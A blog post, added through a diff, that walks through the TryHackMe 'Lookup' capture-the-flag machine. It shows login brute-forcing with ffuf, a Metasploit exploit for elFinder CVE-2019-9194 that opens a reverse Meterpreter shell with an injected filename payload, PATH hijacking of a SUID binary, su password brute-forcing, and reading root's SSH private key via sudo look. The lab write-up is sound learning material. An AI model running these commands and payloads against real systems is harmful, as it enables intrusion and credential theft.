@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>TryHackMe Writeup - &#34;Lookup&#34; | </title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+<style>
+.callout {
+  border-left: 4px solid #4a90d9;
+  background: #e8f0fe;
+  padding: 0.75em 1em;
+  margin: 1em 0;
+  border-radius: 4px;
+}
+.callout > strong {
+  display: block;
+  margin-bottom: 0.25em;
+  text-transform: uppercase;
+  font-size: 0.85em;
+  letter-spacing: 0.05em;
+}
+.callout-warning {
+  border-left-color: #e6a700;
+  background: #fff8e1;
+}
+.callout-tip {
+  border-left-color: #2e7d32;
+  background: #e8f5e9;
+}
+.callout-caution {
+  border-left-color: #d32f2f;
+  background: #fdecea;
+}
+</style>
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">TryHackMe Writeup - &ldquo;Lookup&rdquo;</span></h1>
+<h2 class="author">Michael Dunn</h2>
+<h2 class="date">2025/05/14</h2>
+</div>
+
+<main>
+<h1 id="introduction">Introduction</h1>
+<p><a href="https://tryhackme.com/room/lookup">Lookup</a> is a CTF challenge hosted by <a href="tryhackme.com">TryHackMe</a> that got me familiar with many different red-teaming techniques including fuzzing, path hijacking, and suid manipulation. The VM is an Apache web server running the <a href="https://github.com/Studio-42/elFinder">elFinder web file manager</a> version 2.1.47, a version vulnerable to <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection/">CVE-2019-9194</a>. A Metasploit module is readily available for exploiting this vulnerability. From rapid7:</p>
+<blockquote>
+<p>The PHP connector component allows unauthenticated users to upload
+files and perform file modification operations, such as resizing and
+rotation of an image. The file name of uploaded files is not validated,
+allowing shell metacharacters.</p>
+<p>When performing image operations on JPEG files, the filename is passed
+to the <code>exiftran</code> utility without appropriate sanitization, causing
+shell commands in the file name to be executed, resulting in remote
+command injection as the web server user.</p>
+<p><em>Thomas Chauchefoin</em></p></blockquote>
+<p>After finding a vulnerable binary, I used path-hijacking to have this binary read a malicious <code>id</code>, which returned some potential passwords. I used a <a href="https://github.com/d4t4s3c/suForce">GitHub repo</a> to cycle through these passwords for the user <code>think</code> as the malicious <code>id</code> was set for that user. Using GTFObins, user <code>think</code> could execute a <code>look</code> binary to read any file with root permissions. Reading a private root SSH key and downloading it to the host yielded root access.</p>
+<div class="callout callout-note">
+  <strong>Note</strong>
+  The placeholder &lsquo;RHOST&rsquo; will be used throughout this writeup to denote the IP address of the target machine.
+</div>
+
+<hr>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>I ran an nmap service and basic script scan of open ports on the target machine, opting for just the most popular 100: <code>nmap -sC -sV --top-ports 100 RHOST</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 445f26674b4a919b597a9559c84c2e04 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0a4bb9b177d24879fc2f8a3d643aad94 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> d33b97ea54bc414d0339f68fadb6a0fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://lookup.thm
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p><code>RHOST:80</code> redirects us to an unresolvable domain: <code>lookup.thm</code>, so i&rsquo;ll add it manually to our hosts file.</p>
+<p><code>sudo echo &quot;RHOST lookup.thm&quot; &gt; /etc/hosts</code>.</p>
+<p>I see a pretty basic login form:</p>
+<p><img src="lookup_form.png" alt=""></p>
+<p><em>Courtesy of <a href="https://medium.com/@RosanaFS/tryhackme-lookup-f5944e41c6b8">RosanaFSS</a></em></p>
+<p>I do some manual fuzzing on the login form to look for any different results. I start by trying the username <code>admin</code> and an ambiguous password.</p>
+<blockquote>
+<p>Wrong password.
+Redirecting in 3 seconds.</p></blockquote>
+<p>I tried <code>root</code> as the username and the same password:</p>
+<blockquote>
+<p>Wrong username and password.
+Redirecting in 3 seconds.</p></blockquote>
+<p>The difference in our responses gives us a valuable piece of insight: <strong>there are some usernames that I can try enumerating through</strong>. I&rsquo;ll use Burpsuite to check out these requests a little more.</p>
+<p><img src="burpsuite_output_lookup.png" alt="Burpsuite Output">
+<em>Burpsuite Output</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /login.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">lookup.thm</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">29</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://lookup.thm</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://lookup.thm/</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>username=admin&amp;password=foo
+</span></span></code></pre></div><p>This request implies that whenever I attempt a login on the form/server, I are sending a POST request to <code>/login.php</code>, using the HTTP Content-Type: <code>application/x-www-form-urlencoded</code>.</p>
+<div class="callout callout-note">
+  <strong>Note</strong>
+  I can also note that a successful username attempt has a response content-length of 62 bytes, so when I fuzz for usernames I can use the <code>-ms</code> flag to tell us if I&rsquo;ve enumerated a username successfully.
+</div>
+
+<p>Let&rsquo;s fuzz through the usernames with a wordlist (thank you <a href="https://github.com/danielmiessler/SecLists">seclists</a>!), and wait for a response code of 200, indicating a request that matches our paramter of 62 bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>mike㉿wsl<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/usr/share/seclists/Usernames<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -d <span style="color:#e6db74">&#34;username=FUZZ&amp;password=foo&#34;</span> -w <span style="color:#e6db74">&#34;/usr/share/seclists/Usernames/Names/names.txt&#34;</span> -u http://lookup.thm/login.php -ms <span style="color:#ae81ff">62</span> -c
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>admin                   <span style="color:#f92672">[</span>Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 126ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>jose                    <span style="color:#f92672">[</span>Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 124ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>10177/10177<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">344</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:35<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><hr>
+<h1 id="initial-access">Initial Access</h1>
+<p>Now that I&rsquo;ve successfully enumerated through usernames and yielded a valid user other than our <code>root</code> user, I can try enumerating through a password wordlist for <code>jose</code>. (I filtered size 62 since that was the response size for an incorrect password, but it&rsquo;d probably be best practice to match the status of 302 (redirect code)).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>mike㉿wsl<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/usr/share/seclists/Usernames<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ffuf -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -d <span style="color:#e6db74">&#34;username=jose&amp;password=FUZZ&#34;</span> -w <span style="color:#e6db74">&#34;/usr/share/wordlists/rockyou.txt&#34;</span> -u http://lookup.thm/login.php -fs <span style="color:#ae81ff">62</span> -c
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>password123             <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 123ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Logging in with these credentials sends us to another unresolvable domain, notably because of the subdomain <code>files.</code> (<code>files.lookup.thm</code>). I&rsquo;ll <code>sudo echo &quot;RHOST files.lookup.thm&quot; &gt; /etc/hosts</code> and navigate to the URL.</p>
+<p><img src="elfinder_lookup.png" alt=""></p>
+<p><em>files.lookup.thm</em></p>
+<p>Looks like I&rsquo;m in some sort of file server. I&rsquo;ll investigate these files, like <code>credentials.txt</code> which simply reads: <code>think : nopassword</code>. Attempting these credentials anywhere (SSH, the form to the file server) didn&rsquo;t work. Navigating to &ldquo;About this software&rdquo; (the question mark icon in the tab options in the above image) can tell us more about this file server.</p>
+<p><img src="elfinder_version_info.png" alt=""></p>
+<p><em>files.lookup.thm/about</em></p>
+<p>With a quick Google search, I found that this web server, elFinder v2.1.47 is vulnerable to <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection/">CVE-2019-9194</a>. CVE-2019-9194 is available as a default Metasploit module as <code>exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection</code>.</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<p>I selected the Metasploit module in <code>msfconsole</code> and configure it&rsquo;s requirements.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/webapp/elfinder_php_connector_exiftran_cmd_injection<span style="color:#f92672">)</span> &gt; set RHOSTS RHOST
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; RHOST
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/webapp/elfinder_php_connector_exiftran_cmd_injection<span style="color:#f92672">)</span> &gt; set VHOST files.lookup.thm
+</span></span><span style="display:flex;"><span>VHOST <span style="color:#f92672">=</span>&gt; files.lookup.thm
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/webapp/elfinder_php_connector_exiftran_cmd_injection<span style="color:#f92672">)</span> &gt; set LHOST 0.0.0.0
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; 0.0.0.0
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/webapp/elfinder_php_connector_exiftran_cmd_injection<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">5000</span>
+</span></span></code></pre></div><ul>
+<li><code>RHOST</code> is set as the target machine</li>
+<li><code>LHOST</code> was set to listen on all interfaces</li>
+<li><code>LPORT</code> is an arbitrary port</li>
+<li>I left the default <code>TARGETURI</code> as <code>/elFinder</code></li>
+</ul>
+<p>Running this module uses information uncovered in <code>CVE-2019-9194</code> to upload a malicious payload to the file server to establish a shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>unix/webapp/elfinder_php_connector_exiftran_cmd_injection<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on LHOST.130:5000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading payload <span style="color:#e6db74">&#39;6FB38RiCw.jpg;echo 6370202e2e2f66696c65732f3646423338526943772e6a70672a6563686f2a202e6b736658655338452e706870 |xxd -r -p |sh&amp; #.jpg&#39;</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1969</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering vulnerability via image rotation ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing payload <span style="color:#f92672">(</span>/elFinder/php/.ksfXeS8E.php<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">40004</span> bytes<span style="color:#f92672">)</span> to RHOST
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted .ksfXeS8E.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.21.144.130:5000 -&gt; RHOST:55242<span style="color:#f92672">)</span> at 2025-05-14 02:42:13 -0400
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No reply
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Removing uploaded file ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted uploaded file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt;
+</span></span></code></pre></div><hr>
+<h1 id="exploitation">Exploitation</h1>
+<p>I dropped into a shell by running <code>shell</code>, peeked around at my UID (<code>www-data</code>), working directory (<code>/var/www/files.lookup.thm/public_html/elFinder/php</code>) and upgraded the shell to an interactive TTY:</p>
+<p><code>/bin/bash -i</code> and <code>export TERM=xterm</code>.</p>
+<p>To search for SUID binaries: <code>find / -perm -4000 -type f 2&gt;/dev/null</code></p>
+<ul>
+<li>This command looks for any files with the SUID bit set.</li>
+<li>SUID bit (4000) means to &ldquo;<em>run this file with the privileges of its owner, not the one running it</em>&rdquo;</li>
+<li>So I&rsquo;m looking for SUID bit files, specifically binaries that are owned by root.</li>
+</ul>
+<p>This is an excerpt from the target machine of binaries with the <code>4000</code> SUID bit set:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/sbin/pwm
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span></code></pre></div><p>Running <code>pwm</code> returns:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Running <span style="color:#e6db74">&#39;id&#39;</span> command to extract the username and user ID <span style="color:#f92672">(</span>UID<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ID: www-data
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> File /home/www-data/.passwords not found
+</span></span></code></pre></div><p>So, as part of the <code>pwm</code>&rsquo;s procedure, it scrapes the output of whatever the machine&rsquo;s <code>id</code> returns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@lookup:/tmp$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I can use a technique called <strong>PATH hijacking</strong> to write our own <code>id</code> binary in a folder I control, like <code>/tmp</code>, and point the <code>pwm</code> binary to our custom <code>id</code> binary by setting our <code>PATH</code> variable to <code>/tmp</code> before the rest of default system paths. This tricks <code>pwm</code> into executing our custom <code>id</code> binary instead of the real one. I&rsquo;ll have to make <code>id</code> executable as well.</p>
+<blockquote>
+<p>Notice the change in user from <code>www-data</code> to <code>think</code>:</p></blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@lookup:/tmp$ echo <span style="color:#e6db74">&#34;echo &#39;uid=33(think) gid=33(www-data) groups=33(www-data)&#39;&#34;</span> &gt; id
+</span></span><span style="display:flex;"><span>www-data@lookup:/tmp$ cat id
+</span></span><span style="display:flex;"><span>cat id
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;uid=33(think) gid=33(www-data) groups=33(www-data)&#39;</span>
+</span></span><span style="display:flex;"><span>www-data@lookup:/tmp$ chmod +x id
+</span></span></code></pre></div><p><em>When our custom <code>id</code> binary is run, it echoes what appears to be the output of a standard run of <code>id</code>. <code>pwm</code> uses the output of <code>id</code> to make it&rsquo;s decision, so by altering <code>id</code> I can manipulate <code>pwm</code>&rsquo;s decision-making process.</em></p>
+<p>I&rsquo;ll then run <code>export PATH=/tmp:$PATH</code>, which appends <code>/tmp</code> to the beginning of <code>$PATH</code> so that binaries like <code>pwm</code> will look for binaries in <code>/tmp</code> for its needs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@lookup:/tmp$ pwm | tee passwords.txt
+</span></span><span style="display:flex;"><span>pwm | tee passwords.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Running <span style="color:#e6db74">&#39;id&#39;</span> command to extract the username and user ID <span style="color:#f92672">(</span>UID<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> ID: think
+</span></span><span style="display:flex;"><span>jose1006
+</span></span><span style="display:flex;"><span>jose1004
+</span></span><span style="display:flex;"><span>jose1002
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>Let&rsquo;s brute-force these potential passwords by downloading <a href="https://github.com/d4t4s3c/suForce">this GitHub repo</a>. I&rsquo;ll make it executable <code>chmod +x suForce</code> and move <code>suForce</code> and <code>passwords.txt</code> to <code>/dev/shm</code> since <code>/tmp</code> is not allowing this to execute.</p>
+<div class="callout callout-note">
+  <strong>Note</strong>
+  <p><code>/dev/shm</code> is a <strong>temporary filesystem</strong> (tmpfs) stored in <strong>RAM</strong>.</p>
+<ul>
+<li>It’s writable by all users (<code>drwxrwxrwt</code> permissions, like <code>/tmp</code>).</li>
+<li>It often allows <strong>execution of binaries or scripts</strong>, even when <code>/tmp</code> has <code>noexec</code> set (i.e., execution is blocked there).</li>
+</ul>
+</div>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./suForce -u think -w passwords.txt
+</span></span><span style="display:flex;"><span>───────────────────────────────────
+</span></span><span style="display:flex;"><span> code: d4t4s3c     version: v1.0.0
+</span></span><span style="display:flex;"><span>───────────────────────────────────
+</span></span><span style="display:flex;"><span>🎯 Username | think
+</span></span><span style="display:flex;"><span>📖 Wordlist | passwords.txt
+</span></span><span style="display:flex;"><span>🔎 Status   | 1/51/1%/<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Running <span style="color:#e6db74">&#39;id&#39;</span> command to extract th
+</span></span><span style="display:flex;"><span>🔎 Status   | &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>💥 Password | &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>───────────────────────────────────
+</span></span></code></pre></div><p>Awesome, i&rsquo;ll login to <code>think</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@lookup:/tmp$ su think
+</span></span><span style="display:flex;"><span>su think
+</span></span><span style="display:flex;"><span>Password: &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>think
+</span></span><span style="display:flex;"><span>/bin/bash -i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>think@lookup:/tmp$
+</span></span></code></pre></div><p>I&rsquo;ll then get a list of binaries that are executable by <code>think</code> in the <code>elFinder</code> server directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>think@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ sudo -S -l
+</span></span><span style="display:flex;"><span>sudo -S -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> think: &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> think on lookup:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>User think may run the following commands on lookup:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /usr/bin/look
+</span></span></code></pre></div><p>Checking out <a href="https://gtfobins.github.io/gtfobins/look/">GTFObins</a>:</p>
+<blockquote>
+<p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
+<p>    LFILE=file_to_read
+    sudo look &rsquo;&rsquo; &ldquo;$LFILE&rdquo;</p></blockquote>
+<p>Knowing that SSH is enabled on this box, i&rsquo;ll see if I can extract a private key from <code>root</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>think@lookup:/tmp$ LFILE<span style="color:#f92672">=</span>/root/.ssh/id_rsa
+</span></span><span style="display:flex;"><span>LFILE<span style="color:#f92672">=</span>/root/.ssh/id_rsa
+</span></span><span style="display:flex;"><span>think@lookup:/tmp$ sudo -S look <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#34;</span>$LFILE<span style="color:#e6db74">&#34;</span> | tee /tmp/id_rsa
+</span></span><span style="display:flex;"><span>sudo -S look <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#34;</span>$LFILE<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> think: &lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><hr>
+<h1 id="root">Root</h1>
+<p>I&rsquo;ll download the private key from the Meterpreter session and connect!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mike@wsl:~/Documents/thm/lookup $ sudo ssh RHOST -i id_rsa
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;RHOST (RHOST)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:5: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>RHOST<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> to the list of known hosts.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#ae81ff">13</span> 10:00:24 <span style="color:#ae81ff">2024</span> from 192.168.14.1
